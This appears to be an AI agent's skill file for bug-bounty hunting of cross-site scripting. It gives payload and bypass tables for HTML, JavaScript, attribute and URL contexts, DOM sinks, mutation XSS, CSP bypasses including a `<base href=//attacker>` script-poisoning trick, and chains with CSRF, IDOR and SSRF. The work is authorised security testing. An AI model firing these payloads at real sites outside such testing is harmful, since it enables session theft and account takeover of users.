---
name: hunt-xss
description: Cross-site scripting hunter — reflected, stored, DOM, mXSS, CSP bypass, sink mapping.
keywords: [xss, cross-site scripting, dom, csp, html injection, javascript injection, sanitizer bypass, mxss]
---

# hunt-xss

## When this skill loads

Trigger phrases: "xss", "html injection", "javascript injection", "DOM
sink", "innerHTML", "dangerouslySetInnerHTML", "CSP bypass",
"mutation XSS", "sanitizer bypass", "reflected", "stored xss".

## Quick decision tree

```
HTML context?         → reflected/stored HTML — Phase 1
JS context?           → string-literal break — Phase 2
Attribute context?    → quote-break + event handler — Phase 3
URL context (href)?   → javascript: scheme — Phase 4
Sink in DOM?          → source→sink trace — Phase 5
Sanitizer present?    → mXSS / parser confusion — Phase 6
CSP present?          → CSP bypass matrix — Phase 7
```

## Phase 1 — reflected HTML context

Polyglot for triage:

```
"><svg/onload=alert(1)>
```

If the response shows `&lt;svg`, full HTML encoding — move to filter
bypass. If it shows `<svg/onload=alert(1)>`, you have raw injection.

Bypass matrix:

| Filter | Payload |
|---|---|
| Blocks `<script` | `<svg onload=alert(1)>` or `<img src=x onerror=alert(1)>` |
| Blocks `alert` | `prompt(1)`, `[].constructor.constructor("alert(1)")()` |
| Blocks `(` | `<svg><script>alert\`1\`</script>` (template literals) |
| Blocks spaces | `<svg/onload=alert(1)>` (slash separator) |
| Blocks `=` | `<svg><script>alert(1)</script>` (tag content) |
| HTML entity decode after sanitize | `&lt;svg onload=alert(1)&gt;` |
| Strips on* attrs once | `<svg onono*nload=alert(1)>` (recursion fail) |

## Phase 2 — JS context (string literal)

Find injection inside `<script>var x = "<INJ>";</script>`:

```js
";alert(1);//
```

If quotes encoded but backslash isn't:

```js
\";alert(1);//
```

If both encoded, try unicode escape:

```
\u0022;alert(1);//
```

## Phase 3 — attribute context

Inside `<input value="<INJ>">`:

```
" onfocus=alert(1) autofocus="
```

Inside unquoted attribute `<input value=<INJ>>`:

```
x onmouseover=alert(1)
```

## Phase 4 — URL context

`<a href="<INJ>">`:

```
javascript:alert(1)
javascript:alert(1)//   (with trailing comment in case of suffix concat)
JaVaScRiPt:alert(1)     (case bypass)
\tjavascript:alert(1)   (whitespace bypass)
```

## Phase 5 — DOM-based (source → sink)

Sources to grep in JS bundles:
`location.{href,search,hash,pathname}`, `document.{URL,referrer,cookie}`,
`window.name`, `postMessage`, `localStorage`, `sessionStorage`,
`history.pushState` data arg.

Sinks (dangerous):
`innerHTML`, `outerHTML`, `document.write{,ln}`, `eval`, `Function()`,
`setTimeout`/`setInterval` with string arg, `setAttribute('on*', ...)`,
`location` assignment, `jQuery.html()`, `Vue v-html`, React
`dangerouslySetInnerHTML`, Angular `[innerHTML]` without
`DomSanitizer`.

Confirm with this PoC in the page console (no payload sent yet):

```js
// Run inside the suspect page
const src = location.hash.slice(1);
document.getElementById('x').innerHTML = src;
// then load: https://target/#<img src=x onerror=alert(1)>
```

## Phase 6 — mXSS / mutation XSS

When the app uses DOMPurify or similar and you can't break out:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
```

The string is "safe" until the browser re-parses it after
`innerHTML` insertion — DOMPurify ≤ 3.0.x had multiple of these
disclosed.

## Phase 7 — CSP bypass matrix

| CSP | Bypass |
|---|---|
| `'unsafe-inline'` present | direct `<script>alert(1)</script>` |
| `script-src 'self'` + JSONP endpoint on origin | `<script src=/jsonp?callback=alert(1)//></script>` |
| `script-src 'self'` + file upload on origin | upload `.js`, reference it |
| `script-src 'nonce-XXX'` + dangling markup | inject `<base href=//attacker>` → relative script paths poisoned |
| `script-src 'strict-dynamic'` + DOM clobbering | clobber a trusted script element |
| `script-src *.example.com` + open redirect on `*.example.com` | redirect to attacker JS |
| Angular present | `<div ng-app>{{constructor.constructor('alert(1)')()}}</div>` |
| Trusted Types enforced | look for `default` policy escape hatch |

## Phase 8 — chain templates

| Single XSS limitation | Chain |
|---|---|
| Self-XSS only | + IDOR-set-profile → stored in victim ctx |
| Reflected but POST-only | + CSRF token leak → cross-origin form |
| Reflected but auth-required | + login CSRF (force victim login as attacker) |
| Stored but admin-only view | + SSRF to internal admin UI |
| DOM in `postMessage` handler | iframe target page from attacker, send crafted message |

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #156288 (Shopify) | DOM XSS via `postMessage` without origin check |
| H1 #861940 (HackerOne) | mXSS in markdown render via nested noscript |
| H1 #406587 (PayPal) | Stored XSS via SVG `onload` in profile image |
| H1 #209223 (Twitter) | Reflected XSS via `Accept-Language` reflected in 404 |
| H1 #1130901 (Slack) | DOM clobbering bypassing `strict-dynamic` CSP |
| H1 #1632719 (GitLab) | XSS via Markdown sanitizer + URI scheme handler |
| H1 #1664063 (Apple) | XSS via Safari-only `eval` in JSON response |
| CVE-2023-29489 (cPanel) | Reflected XSS via `/cgi-sys/defaultwebpage.cgi?domain=` |
| CVE-2024-22134 (Foxit) | Stored XSS in PDF annotation |

## Never-submit fallbacks

- **Self-XSS** alone (paste in console; runs as user themselves) →
  KILL unless chained with IDOR or CSRF.
- **Reflected XSS requiring `Content-Type: text/html`** when the
  endpoint always returns `application/json` and target's browsers
  honor it → KILL.
- **XSS in CSS-only context** with no `expression()` (no modern
  browser) → KILL.
- **XSS in `Cache-Control: no-store, private` admin-only page when
  bounty excludes admin features** → KILL.

## See also

- `hunt-csp-bypass` — when CSP is the only blocker
- `hunt-prototype-pollution` — frequent XSS upgrade path in modern SPAs
- `hunt-cors` — for postMessage / cross-origin exfil chains
- `evidence-hygiene` — screenshot sequence (unauth → triggered →
  cookie/DOM impact)
- `triage-validation` — confirm Q4 (not admin-only) and Q7
  (not self-XSS) before reporting
